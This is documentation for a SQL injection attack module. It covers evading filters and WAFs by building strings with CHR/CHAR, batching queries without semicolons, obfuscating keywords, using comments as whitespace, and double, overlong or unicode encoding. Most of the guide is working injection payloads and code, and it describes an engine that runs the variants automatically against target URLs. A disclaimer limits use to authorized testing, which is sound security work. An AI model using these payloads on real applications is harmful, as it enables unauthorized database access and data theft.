# Advanced SQL Injection Bypass Techniques Guide

## Overview

The SQL Attacker module now includes comprehensive advanced bypass techniques for evading application-level SQL injection filters and blacklists. These techniques are implemented in the `bypass_techniques.py` module and automatically integrated into the attack loop.

## Features

### 1. Bypassing Blocked Characters

#### String Construction Without Quotes

When single quotes are blocked by filters, the module can construct strings using database-specific ASCII functions:

**Oracle - CHR() with || concatenation:**
```python
from sql_attacker.bypass_techniques import StringConstructionBypass, DBMSType

# Convert 'admin' to Oracle CHR() format
result = StringConstructionBypass.string_to_chr_oracle("admin")
# Output: CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)
```

**MS-SQL - CHAR() with + concatenation:**
```python
# Convert 'admin' to MS-SQL CHAR() format
result = StringConstructionBypass.string_to_char_mssql("admin")
# Output: CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)
```

**MySQL - CHAR() with comma-separated values:**
```python
# Convert 'admin' to MySQL CHAR() format
result = StringConstructionBypass.string_to_char_mysql("admin")
# Output: CHAR(97,100,109,105,110)
```

**Automatic Payload Conversion:**
```python
# Automatically replace quoted strings in payload
payload = "' OR 'admin'='admin"
result = StringConstructionBypass.bypass_quotes_in_payload(payload, DBMSType.MYSQL)
# Output: ' OR CHAR(97,100,109,105,110)=CHAR(97,100,109,105,110)
```

#### Batch Query Injection Without Semicolons (MS-SQL)

When semicolons are blocked in MS-SQL:

```python
from sql_attacker.bypass_techniques import BatchQueryBypass

queries = ["SELECT 1", "SELECT 2"]

# Using newlines
result = BatchQueryBypass.batch_without_semicolon(queries)
# Output: SELECT 1\nSELECT 2

# Using EXEC wrapper
result = BatchQueryBypass.batch_with_exec(queries)
# Output: EXEC('SELECT 1') EXEC('SELECT 2')
```

### 2. Circumventing Simple Validations/Blacklists

#### Keyword Variants

Generate multiple variants of SQL keywords to bypass naive blacklists:

```python
from sql_attacker.bypass_techniques import KeywordVariantBypass

# Mixed case variants
mixed = KeywordVariantBypass.mixed_case_variant("SELECT", "alternate")
# Output: SeLeCt

# Hex encoding
hex_encoded = KeywordVariantBypass.hex_encode_keyword("SELECT")
# Output: %53%45%4c%45%43%54

# Keyword repetition (bypasses simple string replacement)
repeated = KeywordVariantBypass.keyword_repetition("SELECT")
# Output: SELSELECTECT

# Generate all variants
variants = KeywordVariantBypass.generate_keyword_variants("SELECT")
# Returns: ['SELECT', 'select', 'SELECT', 'SeLeCt', 'SeLEct', '%53%45%4c%45%43%54', 
#           '%53E%4cE%43T', 'SELSELECTECT']
```

#### Apply to Full Payload

```python
payload = "' UNION SELECT NULL"
variants = KeywordVariantBypass.apply_to_payload(payload)
# Returns multiple variants with different keyword obfuscations
```

### 3. Using SQL Comments as Whitespace

#### Replace Spaces with Comments

```python
from sql_attacker.bypass_techniques import CommentWhitespaceBypass

payload = "SELECT FROM users"
result = CommentWhitespaceBypass.space_to_inline_comment(payload)
# Output: SELECT/**/FROM/**/users

# Custom comment style
result = CommentWhitespaceBypass.space_to_inline_comment(payload, "/*!*/")
# Output: SELECT/*!*/FROM/*!*/users
```

#### Break Up Keywords with Comments (MySQL)

Insert comments within keywords to bypass filters:

```python
payload = "SELECT FROM WHERE"
result = CommentWhitespaceBypass.insert_comment_in_keywords(payload)
# Output: SEL/*_*/ECT FROM WH/*_*/ERE
```

#### Logical Block Injection

When comment symbols are blocked:

```python
result = CommentWhitespaceBypass.create_logical_block_injection("base")
# Output: ' OR 'a'='a
```

#### Generate Multiple Comment Variations

```python
payload = "UNION SELECT"
variations = CommentWhitespaceBypass.generate_comment_variations(payload)
# Returns: [
#   "UNION SELECT",
#   "UNION/**/SELECT",
#   "UNION/*!*/SELECT",
#   "UNION/*_*/SELECT",
#   "UNI/*_*/ON SEL/*_*/ECT",
# ]
```

### 4. Exploiting Defective Filters and Canonicalization Bugs

#### Double Encoding

```python
from sql_attacker.bypass_techniques import EncodingBypass

payload = "' OR 1=1"
result = EncodingBypass.double_url_encode(payload)
# Output: %2527%2520OR%25201%253D1
# Note: % is encoded as %25
```

#### Partial Encoding

Mix encoded and non-encoded characters:

```python
# Encode 50% of characters randomly
result = EncodingBypass.partial_encode(payload, ratio=0.5)
# Output: %27 OR %31=%31 (example - random)

# Encode only special characters
result = EncodingBypass.mixed_encoding(payload)
# Output: %27%20OR%201%3D1
```

#### Unicode Encoding

```python
# Standard unicode
result = EncodingBypass.unicode_encode(payload, 'standard')
# Output: \u0027\u0020\u004f\u0052\u0020\u0031\u003d\u0031

# Overlong UTF-8 encoding
result = EncodingBypass.unicode_encode(payload, 'overlong')
# Output: %C0%A7 OR 1=1

# Mixed encoding
result = EncodingBypass.unicode_encode(payload, 'mixed')
# Output: Mix of URL encoding, unicode, and normal characters
```

#### Generate All Encoding Variants

```python
variants = EncodingBypass.generate_encoding_variants(payload)
# Returns multiple encoding variations
```

## Using the Advanced Bypass Engine

The `AdvancedBypassEngine` orchestrates all bypass techniques:

```python
from sql_attacker.bypass_techniques import AdvancedBypassEngine, DBMSType

# Initialize engine
engine = AdvancedBypassEngine(DBMSType.MYSQL)

# Generate all bypass variants for a payload
payload = "' UNION SELECT NULL,NULL,NULL--"
variants = engine.generate_all_bypass_variants(payload, max_variants=20)

# Returns up to 20 diverse bypass variants including:
# - String construction variants
# - Comment-based variants
# - Keyword obfuscation variants
# - Encoding variants
```

### Targeted Bypass Generation

Generate specific types of bypasses:

```python
# String construction only
string_variants = engine.generate_string_construction_variants(payload)

# Comment-based only
comment_variants = engine.generate_comment_bypass_variants(payload)

# Keyword obfuscation only
keyword_variants = engine.generate_keyword_bypass_variants(payload)

# Encoding only
encoding_variants = engine.generate_encoding_bypass_variants(payload)
```

## Integration with SQL Injection Engine

The bypass techniques are automatically integrated into the SQL injection detection engine:

```python
from sql_attacker.sqli_engine import SQLInjectionEngine

# Configure with bypass techniques enabled
config = {
    'enable_bypass_techniques': True,  # Enable advanced bypass techniques
    'enable_adaptive_bypass': True,     # Enable adaptive WAF bypass
    'enable_fingerprinting': True,      # Enable DBMS detection
    # ... other config options
}

engine = SQLInjectionEngine(config)

# Bypass techniques are automatically applied during testing
findings = engine.test_error_based_sqli(
    url='http://example.com/search',
    method='GET',
    params={'q': 'test'}
)
```

### How It Works

1. **DBMS Auto-Detection**: The engine automatically detects the target DBMS type
2. **Bypass Configuration**: The bypass engine is configured with the detected DBMS
3. **Payload Generation**: When testing parameters, the engine generates bypass variants
4. **Adaptive Testing**: If standard payloads fail, bypass variants are automatically tested
5. **Success Tracking**: Successful bypasses are logged for learning

### Bypass Technique Flow

```
Standard Payload → Fails
    ↓
WAF Detection
    ↓
Generate Bypass Variants:
    1. String construction (if quotes blocked)
    2. Comment-based bypasses
    3. Keyword obfuscation
    4. Encoding variations
    ↓
Test Each Variant
    ↓
Success → Report Finding
```

## Configuration Options

### Enable/Disable Bypass Techniques

```python
config = {
    'enable_bypass_techniques': True,   # Master switch for bypass techniques
    'enable_adaptive_bypass': True,     # Enable adaptive WAF bypass system
    'enable_fingerprinting': True,      # Enable DBMS detection for technique selection
}
```

### Bypass Technique Limits

```python
# In _get_bypass_technique_variants method, control max variants:
variants = engine.generate_all_bypass_variants(payload, max_variants=50)
```

## Examples

### Example 1: Bypassing Quote Filters

**Scenario**: Application blocks single quotes

```python
from sql_attacker.bypass_techniques import StringConstructionBypass, DBMSType

original = "' OR 'admin'='admin"
bypass = StringConstructionBypass.bypass_quotes_in_payload(original, DBMSType.MYSQL)

print("Original:", original)
print("Bypass:", bypass)
# Output:
# Original: ' OR 'admin'='admin
# Bypass: ' OR CHAR(97,100,109,105,110)=CHAR(97,100,109,105,110)
```

### Example 2: Bypassing Keyword Blacklist

**Scenario**: Application blocks "SELECT" keyword

```python
from sql_attacker.bypass_techniques import KeywordVariantBypass

original = "' UNION SELECT NULL"

# Try mixed case
variant1 = original.replace("SELECT", KeywordVariantBypass.mixed_case_variant("SELECT"))
print("Variant 1:", variant1)
# Output: ' UNION SeLeCt NULL

# Try keyword repetition
variant2 = original.replace("SELECT", KeywordVariantBypass.keyword_repetition("SELECT"))
print("Variant 2:", variant2)
# Output: ' UNION SELSELECTECT NULL

# Try hex encoding
variant3 = original.replace("SELECT", KeywordVariantBypass.hex_encode_keyword("SELECT"))
print("Variant 3:", variant3)
# Output: ' UNION %53%45%4c%45%43%54 NULL
```

### Example 3: Bypassing Space Filters

**Scenario**: Application blocks spaces

```python
from sql_attacker.bypass_techniques import CommentWhitespaceBypass

original = "UNION SELECT NULL"
bypass = CommentWhitespaceBypass.space_to_inline_comment(original)

print("Original:", original)
print("Bypass:", bypass)
# Output:
# Original: UNION SELECT NULL
# Bypass: UNION/**/SELECT/**/NULL
```

### Example 4: Comprehensive Bypass

**Scenario**: Need multiple bypass techniques

```python
from sql_attacker.bypass_techniques import AdvancedBypassEngine, DBMSType

engine = AdvancedBypassEngine(DBMSType.MYSQL)
original = "' UNION SELECT NULL,NULL,NULL--"

# Generate 30 diverse bypass variants
variants = engine.generate_all_bypass_variants(original, max_variants=30)

print(f"Generated {len(variants)} bypass variants:")
for i, variant in enumerate(variants[:5], 1):
    print(f"{i}. {variant}")

# Example output:
# 1. ' UNION SELECT NULL,NULL,NULL--
# 2. ' UNION/**/SELECT/**/NULL,NULL,NULL--
# 3. ' UnIoN SeLeCt NULL,NULL,NULL--
# 4. %27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--
# 5. ' UNI/*_*/ON SEL/*_*/ECT NULL,NULL,NULL--
```

## Testing

Run the comprehensive test suite:

```bash
# Run all bypass technique tests
python manage.py test sql_attacker.test_bypass_techniques

# Run specific test class
python manage.py test sql_attacker.test_bypass_techniques.StringConstructionBypassTest

# Run specific test method
python manage.py test sql_attacker.test_bypass_techniques.StringConstructionBypassTest.test_string_to_chr_oracle
```

## Best Practices

1. **Enable Fingerprinting**: Always enable DBMS fingerprinting for optimal bypass technique selection
2. **Start Simple**: Test standard payloads first before applying bypass techniques
3. **Limit Variants**: Use reasonable max_variants limits to avoid excessive requests
4. **Monitor Success**: Track which bypass techniques work for future optimization
5. **Combine Techniques**: The engine automatically combines multiple techniques for maximum effectiveness

## Security Considerations

⚠️ **Important**: These techniques are for authorized security testing only. Always ensure you have:

- Written permission to test the target application
- Clear scope definition and rules of engagement
- Proper authorization and legal approval
- Understanding of potential impact

Unauthorized testing is illegal and unethical.

## References

- Oracle CHR() function: https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/CHR.html
- MS-SQL CHAR() function: https://docs.microsoft.com/en-us/sql/t-sql/functions/char-transact-sql
- MySQL CHAR() function: https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_char
- SQL Injection Prevention: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

## Troubleshooting

### Issue: Bypass variants not being generated

**Solution**: Ensure `enable_bypass_techniques` is set to `True` in config

### Issue: String construction not working

**Solution**: Verify DBMS type is correctly detected or manually set:
```python
engine.bypass_engine.set_dbms(DBMSType.MYSQL)
```

### Issue: Too many requests being made

**Solution**: Reduce `max_variants` parameter:
```python
variants = engine.generate_all_bypass_variants(payload, max_variants=10)
```

## Contributing

To add new bypass techniques:

1. Add the technique as a static method in the appropriate class
2. Add comprehensive unit tests
3. Update this documentation
4. Consider integration with the `AdvancedBypassEngine`

## Support

For issues or questions about bypass techniques:
- Check the test files for usage examples
- Review the inline documentation in `bypass_techniques.py`
- Consult the main SQL Attacker documentation
